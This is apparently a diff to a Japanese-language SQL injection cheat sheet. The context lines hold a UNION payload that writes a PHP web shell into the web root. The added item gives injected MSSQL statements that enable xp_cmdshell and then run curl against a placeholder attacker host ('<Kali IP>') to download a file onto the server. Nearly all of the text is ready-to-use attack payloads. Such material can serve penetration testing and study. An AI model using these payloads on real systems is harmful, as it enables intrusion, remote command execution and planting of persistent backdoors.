@@ -176,3 +176,10 @@ SELECT 'hogehoge' INTO OUTFILE '/tmp/test.txt';
 ```.sql
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
+
+31. MSSQLでRCEを実行できるようにするための設定をWebからおこなってコマンド実行
+```
+ ' EXECUTE sp_configure "show advanced option", 1; RECONFIGURE; -- -
+ ' EXECUTE sp_configure "xp_cmdshell", 1; RECONFIGURE; --
+ ' EXECUTE xp_cmdshell "curl <Kali IP> -o C:\Users\Public\test" ; --
+ ```
